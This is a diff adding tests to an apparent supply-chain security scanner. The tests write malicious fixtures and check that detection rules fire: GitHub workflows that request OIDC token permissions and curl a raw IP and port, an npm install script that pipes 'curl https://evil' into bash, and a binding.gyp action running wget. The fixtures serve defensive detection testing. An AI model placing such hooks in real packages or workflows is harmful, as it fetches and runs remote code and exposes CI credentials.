@@ -8,8 +8,9 @@ from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[1]
 VENDOR_STATIC = ROOT / "vendor" / "chaintrap-static-scan" / "src"
+VENDOR_CI = ROOT / "vendor" / "chaintrap-ci" / "src"
 SCRIPTS = ROOT / "scripts"
-for p in (SCRIPTS, VENDOR_STATIC):
+for p in (SCRIPTS, VENDOR_CI, VENDOR_STATIC):
     if str(p) not in sys.path:
         sys.path.insert(0, str(p))
 
@@ -167,6 +168,55 @@ def test_self_hosted_runner_registration_detected(tmp_path):
     findings = audit_workflows(ws)
     ctw7 = [f for f in findings if f["rule_id"] == "CTW-007" and f["severity"] == "CRITICAL"]
     assert ctw7
+
+
+def test_megalodon_c2_and_oidc_detected(tmp_path):
+    ws = _write_wf(
+        tmp_path,
+        "megalodon.yml",
+        "name: SysDiag\non: [push]\n"
+        "permissions:\n  id-token: write\n  actions: read\n"
+        "jobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: curl http://216.126.225.129:8443/x\n",
+    )
+    rules = {f["rule_id"] for f in audit_workflows(ws)}
+    assert "CTW-010" in rules
+    assert "CTW-011" in rules
+
+
+def test_miasma_marker_and_phantom_gyp(tmp_path):
+    pkg = tmp_path / "pkg"
+    pkg.mkdir()
+    (pkg / "package.json").write_text(
+        '{"name":"x","version":"1.0.0","gypfile":true,'
+        '"scripts":{"install":"curl https://evil | bash"}}',
+        encoding="utf-8",
+    )
+    (pkg / "binding.gyp").write_text(
+        '{"targets":[{"target_name":"x","actions":[{"action":["bash","-c","wget x"]}]}]}',
+        encoding="utf-8",
+    )
+    (pkg / "drop.js").write_text("const d='Miasma: The Spreading Blight';\n", encoding="utf-8")
+    rules = {h.rule_id for h in scan_tree(pkg, "npm")}
+    assert "CTC-IOC002" in rules
+    assert "CTC-TTP010" in rules
+
+
+def test_bundled_workflow_in_tarball(tmp_path):
+    from chaintrap_ci.workflow_audit import audit_bundled_workflows, workflow_findings_to_content_hits
+
+    root = tmp_path / "extract"
+    wf = root / "package" / ".github" / "workflows"
+    wf.mkdir(parents=True)
+    (wf / "SysDiag.yml").write_text(
+        "name: SysDiag\non: [push]\npermissions:\n  id-token: write\n  actions: read\n"
+        "jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+        "      - run: curl http://216.126.225.129:8443\n",
+        encoding="utf-8",
+    )
+    hits = workflow_findings_to_content_hits(audit_bundled_workflows(root))
+    rules = {h["rule_id"] for h in hits}
+    assert any(r.startswith("CTC-WF-010") for r in rules)
 
 
 def test_known_compromised_action_detected(tmp_path):
